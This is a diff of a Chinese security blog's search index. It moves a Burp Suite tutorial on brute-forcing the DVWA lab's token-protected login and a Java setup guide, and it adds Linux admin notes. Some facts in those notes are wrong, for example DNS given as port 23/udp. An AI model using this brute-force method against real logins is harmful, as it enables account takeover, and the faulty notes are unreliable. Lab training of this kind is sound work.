@@ -89,67 +89,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Burpsuite绕过Token爆破</title>
-    <url>/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/</url>
-    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Token是服务器端生成的、下发给客户端的、用来对客户端身份进行验证的一种令牌；若是Token不匹配，则不会进行身份验证。所以需要对Token进行识别匹配，从而使密码爆破能够顺利进行。</p>
-<p>环境：</p>
-<p>DVWA + Burpsuite Pro</p>
-<h1 id="二、流程"><a href="#二、流程" class="headerlink" title="二、流程"></a>二、流程</h1><p>1、使用DVWA的高级模式，进入爆破模块，进行抓包，并发送到攻击器。</p>
-<p>2、进行如下配置</p>
-<p>Position模块</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164115625.png" alt="image-20210809164115625" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164115625.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：攻击模式选择Pitchfork，意为多对多，一一匹配。</span><br><span class="line">2、选定密码和token字段设置变量</span><br></pre>
-
-
-
-<p>Paloads模块 – 1</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164127222.png" alt="image-20210809164127222" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164127222.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：选定第一个变量（密码）</span><br><span class="line">2：攻击载荷选择简单列表</span><br><span class="line">3：选择从文件导入（这里做演示则随机添加了包含正确密码的若干密码）</span><br></pre>
-
-<p>注意：1处需要配置第二个变量的密码模式（token），后续会对token配置，回头再回此设置。</p>
-<p>Resource Pool模块</p>
-<p>（注：这里是最新版的多线程模块，老版本应在Request Engine处）</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164239466.png" alt="image-20210809164239466" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164239466.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">多线程设置为1，因为token是服务器端生成的验证令牌，无法多线程爆破（一次只有一个token生效）</span><br></pre>
-
-<p>Option模块</p>
-<p>选择Grep Extract模块</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164250278.png" alt="image-20210809164250278" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164250278.png" class="lozad post-image"></p>
-<p>点击Add，依次填写</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164302558.png" alt="image-20210809164302558" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164302558.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：获取返回包内容</span><br><span class="line">2：匹配关键字token</span><br><span class="line">3：选定token值，自动生成匹配规则</span><br><span class="line">4：OK</span><br></pre>
-
-
-
-<p>Redirections模块</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164312043.png" alt="image-20210809164312043" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164312043.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">选定本次抓包的全部内容为重定向的范围（token在body的隐藏部分）</span><br></pre>
-
-
-
-<p>最后，回到Payloads模块</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164328050.png" alt="image-20210809164328050" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164328050.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：选定第二个变量</span><br><span class="line">2：选定payload类型--递归匹配（这里选完后自动加载了刚刚配置token的匹配规则--payload option部分）</span><br><span class="line">3：粘贴抓包部分的token值--需要给定初次抓包的匹配值</span><br><span class="line">4：配置完成，开始攻击</span><br></pre>
-
-<p>3、结果</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164338459.png" alt="image-20210809164338459" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164338459.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">可见token自动匹配，发包成功</span><br></pre>
-
-
-
-<p>按照长度排序（状态码相同，无法参考）</p>
-<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164352072.png" alt="image-20210809164352072" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164352072.png" class="lozad post-image"></p>
-<p>在返回包的Render部分，可见DVWA爆破成功的界面。</p>
-<p>至此，token绕过爆破攻击结束。</p>
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>绕过Token爆破</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CSRF</title>
     <url>/article/CSRF/</url>
     <content><![CDATA[<p>CSRF，（Cross-siterequestforgery），跨站请求伪造。</p>
@@ -232,6 +171,67 @@
       </categories>
       <tags>
         <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Burpsuite绕过Token爆破</title>
+    <url>/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/</url>
+    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Token是服务器端生成的、下发给客户端的、用来对客户端身份进行验证的一种令牌；若是Token不匹配，则不会进行身份验证。所以需要对Token进行识别匹配，从而使密码爆破能够顺利进行。</p>
+<p>环境：</p>
+<p>DVWA + Burpsuite Pro</p>
+<h1 id="二、流程"><a href="#二、流程" class="headerlink" title="二、流程"></a>二、流程</h1><p>1、使用DVWA的高级模式，进入爆破模块，进行抓包，并发送到攻击器。</p>
+<p>2、进行如下配置</p>
+<p>Position模块</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164115625.png" alt="image-20210809164115625" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164115625.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：攻击模式选择Pitchfork，意为多对多，一一匹配。</span><br><span class="line">2、选定密码和token字段设置变量</span><br></pre>
+
+
+
+<p>Paloads模块 – 1</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164127222.png" alt="image-20210809164127222" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164127222.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：选定第一个变量（密码）</span><br><span class="line">2：攻击载荷选择简单列表</span><br><span class="line">3：选择从文件导入（这里做演示则随机添加了包含正确密码的若干密码）</span><br></pre>
+
+<p>注意：1处需要配置第二个变量的密码模式（token），后续会对token配置，回头再回此设置。</p>
+<p>Resource Pool模块</p>
+<p>（注：这里是最新版的多线程模块，老版本应在Request Engine处）</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164239466.png" alt="image-20210809164239466" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164239466.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">多线程设置为1，因为token是服务器端生成的验证令牌，无法多线程爆破（一次只有一个token生效）</span><br></pre>
+
+<p>Option模块</p>
+<p>选择Grep Extract模块</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164250278.png" alt="image-20210809164250278" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164250278.png" class="lozad post-image"></p>
+<p>点击Add，依次填写</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164302558.png" alt="image-20210809164302558" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164302558.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：获取返回包内容</span><br><span class="line">2：匹配关键字token</span><br><span class="line">3：选定token值，自动生成匹配规则</span><br><span class="line">4：OK</span><br></pre>
+
+
+
+<p>Redirections模块</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164312043.png" alt="image-20210809164312043" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164312043.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">选定本次抓包的全部内容为重定向的范围（token在body的隐藏部分）</span><br></pre>
+
+
+
+<p>最后，回到Payloads模块</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164328050.png" alt="image-20210809164328050" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164328050.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：选定第二个变量</span><br><span class="line">2：选定payload类型--递归匹配（这里选完后自动加载了刚刚配置token的匹配规则--payload option部分）</span><br><span class="line">3：粘贴抓包部分的token值--需要给定初次抓包的匹配值</span><br><span class="line">4：配置完成，开始攻击</span><br></pre>
+
+<p>3、结果</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164338459.png" alt="image-20210809164338459" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164338459.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">可见token自动匹配，发包成功</span><br></pre>
+
+
+
+<p>按照长度排序（状态码相同，无法参考）</p>
+<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164352072.png" alt="image-20210809164352072" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210809164352072.png" class="lozad post-image"></p>
+<p>在返回包的Render部分，可见DVWA爆破成功的界面。</p>
+<p>至此，token绕过爆破攻击结束。</p>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>绕过Token爆破</tag>
       </tags>
   </entry>
   <entry>
@@ -1442,51 +1442,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Java环境变量配置</title>
-    <url>/article/Java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<h2 id="java8环境配置"><a href="#java8环境配置" class="headerlink" title="java8环境配置"></a>java8环境配置</h2><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
-<p>2、新建 JAVA_HOME</p>
-<pre class="highlight"><span class="line">C:\Program Files\Java\jdk1.8.0_281		#根据具体路径更改</span><br></pre>
-
-<p>3、新建 CLASSPATH</p>
-<pre class="highlight"><span class="line">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre>
-
-<p>4、修改 Path-新增</p>
-<pre class="highlight"><span class="line">%JAVA_HOME%\bin;</span><br><span class="line">%JAVA_HOME%\jre\bin;</span><br></pre>
-
-<p>注！环境变量path中，首行删除java自带的环境变量，否则自定义变量无法生效</p>
-<pre class="highlight"><span class="line">C:\Program Files\Common Files\Oracle\Java\javapath</span><br></pre>
-
-<p>且移动环境变量配置于此行之上</p>
-<pre class="highlight"><span class="line">C:\Program Files(x86)\Common Files\Oracle\Java\javapath</span><br></pre>
-
-<p>最后注意移动任意绝对路径至行首，否则path路径再次打开将以单行显示</p>
-<h2 id="java11环境配置"><a href="#java11环境配置" class="headerlink" title="java11环境配置"></a>java11环境配置</h2><p>同上，无需修改</p>
-<h2 id="Java版本切换"><a href="#Java版本切换" class="headerlink" title="Java版本切换"></a>Java版本切换</h2><p>1、新建JAVA8_HOME、JAVA11_HOME（JAVA_HOME已在上面新建）</p>
-<p>2、新建java8.bat</p>
-<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA8_HOME%&quot; /m</span><br></pre>
-
-<p>3、新建java11.bat</p>
-<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA11_HOME%&quot; /m</span><br></pre>
-
-<p>注：管理员权限运行</p>
-<h1 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h1><p>家目录下执行</p>
-<pre class="highlight"><span class="line">vim .zshrc</span><br></pre>
-
-<p>最后一行添加</p>
-<pre class="highlight"><span class="line">alias java8=&quot;java8路径/bin/java&quot;</span><br></pre>
-
-<p>重新加载配置文件</p>
-<pre class="highlight"><span class="line">source .zshrc</span><br></pre>
-]]></content>
-      <categories>
-        <category>环境搭建</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>JavaScript基础</title>
     <url>/article/JavaScript%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h1 id="js调用方法（4种）"><a href="#js调用方法（4种）" class="headerlink" title="js调用方法（4种）"></a>js调用方法（4种）</h1><table>
@@ -1691,6 +1646,51 @@
       </tags>
   </entry>
   <entry>
+    <title>Java环境变量配置</title>
+    <url>/article/Java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<h2 id="java8环境配置"><a href="#java8环境配置" class="headerlink" title="java8环境配置"></a>java8环境配置</h2><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
+<p>2、新建 JAVA_HOME</p>
+<pre class="highlight"><span class="line">C:\Program Files\Java\jdk1.8.0_281		#根据具体路径更改</span><br></pre>
+
+<p>3、新建 CLASSPATH</p>
+<pre class="highlight"><span class="line">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre>
+
+<p>4、修改 Path-新增</p>
+<pre class="highlight"><span class="line">%JAVA_HOME%\bin;</span><br><span class="line">%JAVA_HOME%\jre\bin;</span><br></pre>
+
+<p>注！环境变量path中，首行删除java自带的环境变量，否则自定义变量无法生效</p>
+<pre class="highlight"><span class="line">C:\Program Files\Common Files\Oracle\Java\javapath</span><br></pre>
+
+<p>且移动环境变量配置于此行之上</p>
+<pre class="highlight"><span class="line">C:\Program Files(x86)\Common Files\Oracle\Java\javapath</span><br></pre>
+
+<p>最后注意移动任意绝对路径至行首，否则path路径再次打开将以单行显示</p>
+<h2 id="java11环境配置"><a href="#java11环境配置" class="headerlink" title="java11环境配置"></a>java11环境配置</h2><p>同上，无需修改</p>
+<h2 id="Java版本切换"><a href="#Java版本切换" class="headerlink" title="Java版本切换"></a>Java版本切换</h2><p>1、新建JAVA8_HOME、JAVA11_HOME（JAVA_HOME已在上面新建）</p>
+<p>2、新建java8.bat</p>
+<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA8_HOME%&quot; /m</span><br></pre>
+
+<p>3、新建java11.bat</p>
+<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA11_HOME%&quot; /m</span><br></pre>
+
+<p>注：管理员权限运行</p>
+<h1 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h1><p>家目录下执行</p>
+<pre class="highlight"><span class="line">vim .zshrc</span><br></pre>
+
+<p>最后一行添加</p>
+<pre class="highlight"><span class="line">alias java8=&quot;java8路径/bin/java&quot;</span><br></pre>
+
+<p>重新加载配置文件</p>
+<pre class="highlight"><span class="line">source .zshrc</span><br></pre>
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux提权</title>
     <url>/article/Linux%E6%8F%90%E6%9D%83/</url>
     <content><![CDATA[<p>基础漏洞提权、数据库提权、SUID提权</p>
@@ -1813,6 +1813,315 @@
       </categories>
       <tags>
         <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux随记</title>
+    <url>/article/Linux%E9%9A%8F%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h1><h2 id="配置静态IP："><a href="#配置静态IP：" class="headerlink" title="配置静态IP："></a>配置静态IP：</h2><pre class="highlight"><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eth0 或ifcfg-ens33</span><br><span class="line"></span><br><span class="line">ONBOOT=yes</span><br><span class="line"></span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line"></span><br><span class="line">IPADDR=&quot;192.168.x.x&quot;</span><br><span class="line"></span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;</span><br><span class="line"></span><br><span class="line">GATEWAY=&quot;192.168.x.1&quot;</span><br><span class="line">ifdown eth0   禁用网卡</span><br><span class="line"></span><br><span class="line">ifup eth0      启用网卡</span><br></pre>
+
+<h2 id="配置DNS："><a href="#配置DNS：" class="headerlink" title="配置DNS："></a>配置DNS：</h2><pre class="highlight"><span class="line">vim /etc/resolv.conf</span><br><span class="line"></span><br><span class="line">nameserver 8.8.8.8</span><br></pre>
+
+<h2 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h2><p>arp -a 192.168.x.x 查看ip是否被使用，用来选择静态ip</p>
+<p>常用DNS：</p>
+<p>国内：114.114.114.114、223.5.5.5、119.29.29.29等</p>
+<p>国外：1.1.1.1、8.8.8.8等</p>
+<h1 id="重要目录及文件"><a href="#重要目录及文件" class="headerlink" title="重要目录及文件"></a>重要目录及文件</h1><table>
+<thead>
+<tr>
+<th align="left">目录</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">/etc</td>
+<td align="left">存放所有管理系统所需要的配置文件和子目录</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">/etc/passwd #存放操作系统用户信息 /etc/shadow #存放操作系统账户密码 /etc/group #存储当前系统中所有用户组信息 /etc/gshadow #存储用户组密码的一类信息 /etc/nginx/nginx.conf # Nginx配置文件 /etc/httpd/conf/httpd.conf # Apache配置文件路径</td>
+</tr>
+<tr>
+<td align="left">/usr</td>
+<td align="left">Linux系统资源目录，类似Windows下的program files目录</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">/usr/local/nginx/html # Nginx默认网站路径</td>
+</tr>
+<tr>
+<td align="left">/var</td>
+<td align="left">系统运行时需要改变的数据&lt;br /</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">/var/log #日志存放目录 /var/spool/cron #计划任务目录，定时执行 /var/lib/mysql # mysql数据路径 /var/www/html # Apache默认网站路径</td>
+</tr>
+</tbody></table>
+<h1 id="常用解压压缩"><a href="#常用解压压缩" class="headerlink" title="常用解压压缩"></a>常用解压压缩</h1><pre class="highlight"><span class="line">tar -zxvf file  -C ./dir			  	#解压.tar.gz文件到指定文件夹</span><br><span class="line"></span><br><span class="line">tar -zcvf ./file  file1 file2			#打包压缩成.tar.gz文件，注意，压缩成的文件需要在-f参数后面</span><br><span class="line"></span><br><span class="line">unzip file								#解压zip文件</span><br><span class="line"></span><br><span class="line">zip file								#压缩zip文件</span><br><span class="line">7za x file.7z -r -o./					#解压</span><br><span class="line">7za a -t7z file.7z /opt/fileName/*		#压缩</span><br></pre>
+
+<p>注：压缩中，-t指定压缩类型，可忽略（默认7z）</p>
+<p>下载使用</p>
+<pre class="highlight"><span class="line">yum install p7zip -y</span><br></pre>
+
+<h1 id="VI使用"><a href="#VI使用" class="headerlink" title="VI使用"></a>VI使用</h1><table>
+<thead>
+<tr>
+<th align="left">命令</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">i、I</td>
+<td align="left">i光标处输入，I所在行第一个非空格符处输入</td>
+</tr>
+<tr>
+<td align="left">a、A</td>
+<td align="left">a光标下一个字符处输入，A行末处输入</td>
+</tr>
+<tr>
+<td align="left">o、O</td>
+<td align="left">o光标下一新行输入，O光标上一新行输入</td>
+</tr>
+<tr>
+<td align="left">ESC</td>
+<td align="left">命令模式</td>
+</tr>
+<tr>
+<td align="left">ctrl+b</td>
+<td align="left">上翻</td>
+</tr>
+<tr>
+<td align="left">ctrl+f</td>
+<td align="left">下翻</td>
+</tr>
+<tr>
+<td align="left">0</td>
+<td align="left">移动到行首</td>
+</tr>
+<tr>
+<td align="left">$</td>
+<td align="left">移动到行尾</td>
+</tr>
+<tr>
+<td align="left">gg</td>
+<td align="left">移动到文档首</td>
+</tr>
+<tr>
+<td align="left">G</td>
+<td align="left">移动到文档尾</td>
+</tr>
+<tr>
+<td align="left">:%s/word1/word2/g</td>
+<td align="left">全局替换word1为word2</td>
+</tr>
+<tr>
+<td align="left">/word</td>
+<td align="left">向光标之下寻找word字符串</td>
+</tr>
+<tr>
+<td align="left">?word</td>
+<td align="left">向光标之上寻找word字符串</td>
+</tr>
+<tr>
+<td align="left">x、X</td>
+<td align="left">剪切</td>
+</tr>
+<tr>
+<td align="left">dd</td>
+<td align="left">删除整行</td>
+</tr>
+<tr>
+<td align="left">ndd</td>
+<td align="left">删除n行</td>
+</tr>
+<tr>
+<td align="left">yy</td>
+<td align="left">复制整行</td>
+</tr>
+<tr>
+<td align="left">nyy</td>
+<td align="left">复制n行</td>
+</tr>
+<tr>
+<td align="left">p、P</td>
+<td align="left">p向下粘贴，P向上粘贴</td>
+</tr>
+<tr>
+<td align="left">u</td>
+<td align="left">撤销，直至还原</td>
+</tr>
+<tr>
+<td align="left">ctrl+r</td>
+<td align="left">撤销，仅限一步</td>
+</tr>
+<tr>
+<td align="left">.</td>
+<td align="left">重复上一个动作</td>
+</tr>
+<tr>
+<td align="left">:q</td>
+<td align="left">不保存退出</td>
+</tr>
+<tr>
+<td align="left">:w</td>
+<td align="left">保存退出</td>
+</tr>
+<tr>
+<td align="left">:!</td>
+<td align="left">强制执行</td>
+</tr>
+<tr>
+<td align="left">:! command</td>
+<td align="left">暂时离开vi执行command</td>
+</tr>
+<tr>
+<td align="left">:set nu</td>
+<td align="left">显示行号</td>
+</tr>
+<tr>
+<td align="left">:set nonu</td>
+<td align="left">取消显示行号</td>
+</tr>
+</tbody></table>
+<h1 id="查找命令"><a href="#查找命令" class="headerlink" title="查找命令"></a>查找命令</h1><pre class="highlight"><span class="line">find / -name &quot;file&quot;  在根目录下查看文件名为file的文件</span><br><span class="line">find / -perm &quot;root&quot;  在根目录下查找root权限文件</span><br><span class="line">find / -user &quot;root&quot;  在根目录下查找root用户文件</span><br></pre>
+
+<h1 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h1><h2 id="curl安装"><a href="#curl安装" class="headerlink" title="curl安装"></a>curl安装</h2><p>（需要有下载路径，本机对服务器的下载）</p>
+<p>curl _ip/_file -o filename -o可替换为&gt;</p>
+<h2 id="scp上传"><a href="#scp上传" class="headerlink" title="scp上传"></a>scp上传</h2><p>（需要有源文件，本机对服务器的上传）</p>
+<p>scp：ssh+sftp，占用ssh端口及账号及部分功能，使用sftp协议，进行文件上传</p>
+<p>scp filename root@ip:/_path</p>
+<h2 id="yum安装"><a href="#yum安装" class="headerlink" title="yum安装"></a>yum安装</h2><p>（需要源网站里面有对应的软件）</p>
+<table>
+<thead>
+<tr>
+<th align="left">命令</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">yum search</td>
+<td align="left">查找</td>
+</tr>
+<tr>
+<td align="left">yum install</td>
+<td align="left">安装</td>
+</tr>
+<tr>
+<td align="left">yum remove</td>
+<td align="left">移除</td>
+</tr>
+<tr>
+<td align="left">yum update</td>
+<td align="left">升级，可指定升级，也可全部升级</td>
+</tr>
+</tbody></table>
+<p>注：yum源文件：/etc/yum.repos.d</p>
+<h2 id="wget安装"><a href="#wget安装" class="headerlink" title="wget安装"></a>wget安装</h2><p>（同curl，但是更简单，速度更快）</p>
+<p>wget _path/_file</p>
+<h2 id="源码安装步骤"><a href="#源码安装步骤" class="headerlink" title="源码安装步骤"></a>源码安装步骤</h2><table>
+<thead>
+<tr>
+<th align="left">命令</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">1、tar 解包</td>
+<td align="left">解压缩源码包到指定目录</td>
+</tr>
+<tr>
+<td align="left">2、./configure</td>
+<td align="left">配置生成makefile文件，可手动配置参数（如安装路径）</td>
+</tr>
+<tr>
+<td align="left">3、make编译</td>
+<td align="left">生成可执行的二进制文件</td>
+</tr>
+<tr>
+<td align="left">4、make install安装</td>
+<td align="left">复制二进制文件到系统，配置应用环境（如应用安装路径配置文件）</td>
+</tr>
+</tbody></table>
+<p>注：configure配置文档（官方文档）</p>
+<p><a href="http://nginx.org/en/docs/configure/html">http://nginx.org/en/docs/configure/html</a></p>
+<h1 id="firewall防火墙配置"><a href="#firewall防火墙配置" class="headerlink" title="firewall防火墙配置"></a>firewall防火墙配置</h1><table>
+<thead>
+<tr>
+<th>命令</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>firewall-cmd –state</td>
+<td align="left">查看防火墙状态</td>
+</tr>
+<tr>
+<td>firewall-cmd –get-active-zones</td>
+<td align="left">查看正在使用的区域及网卡名称</td>
+</tr>
+<tr>
+<td>firewall-cmd –list-all-zones</td>
+<td align="left">显示当前预期网卡配置参数、资源、端口及服务等信息</td>
+</tr>
+<tr>
+<td>firewall-cmd –zone=public –add-port=80/tcp –permanent</td>
+<td align="left">允许80端口tcp流量通过，永久生效</td>
+</tr>
+<tr>
+<td>firewall-cmd –zone=public –add-service=http –permanent</td>
+<td align="left">同上，不同的配置方式</td>
+</tr>
+<tr>
+<td>firewall-cmd –zone=public –remove-port=23/udp –permanent</td>
+<td align="left">禁止23端口udp流量通过，永久生效</td>
+</tr>
+<tr>
+<td>firewall-zone –zone=public –remove-service=dns –permanent</td>
+<td align="left">同上，不同配置方式</td>
+</tr>
+</tbody></table>
+<p>常用端口服务：</p>
+<table>
+<thead>
+<tr>
+<th align="left">服务</th>
+<th align="left">端口</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">http</td>
+<td align="left">80/tcp</td>
+</tr>
+<tr>
+<td align="left">https</td>
+<td align="left">443/tcp</td>
+</tr>
+<tr>
+<td align="left">dns</td>
+<td align="left">23/udp</td>
+</tr>
+<tr>
+<td align="left">mysql</td>
+<td align="left">3306/tcp</td>
+</tr>
+<tr>
+<td align="left">ssh</td>
